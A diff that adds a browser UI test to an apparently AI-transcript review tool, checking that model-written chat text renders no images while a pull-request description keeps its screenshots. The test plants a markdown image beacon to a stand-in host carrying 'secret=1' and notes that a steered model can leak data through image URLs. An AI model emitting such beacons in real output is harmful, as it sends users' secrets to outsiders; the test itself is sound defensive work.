@@ -334,6 +334,24 @@ def test_the_markup_carries_no_inline_handlers_or_script_urls(page):
     assert page.errors == []
 
 
+def test_model_text_renders_without_images_while_a_description_keeps_its_screenshots(page):
+    """An image URL is a way for a steered model to send data out; a PR author's screenshot is content."""
+    _open_study(page, 2)
+    page.evaluate(
+        """() => {
+          byNum[2].body = 'Before and after:\\n\\n![shot](https://example.test/shot.png)';
+          study[2].entries.push({id: 99, ts: 'now', kind: 'chat', by: 'model', role: 'assistant',
+                                 text: 'Look: ![beacon](https://example.test/leak?secret=1) and **bold**'});
+          renderDrawer();
+        }"""
+    )
+    assert page.locator("#drawer .transcript img").count() == 0, "nothing a model wrote loads an image"
+    assert page.locator("#drawer .transcript strong", has_text="bold").count() == 1, "the rest still renders"
+    page.click('[data-dtab="overview"]')
+    assert page.get_attribute("#drawer .desc img", "src") == "https://example.test/shot.png"
+    assert page.errors == []
+
+
 def test_strings_from_the_forge_and_the_profile_stay_inside_their_attributes(page):
     """Check names, PR and check URLs, instruction URLs, and the profile's author badges are third-party text.
     CSP would stop a script either way; this is about the markup staying what the page meant."""
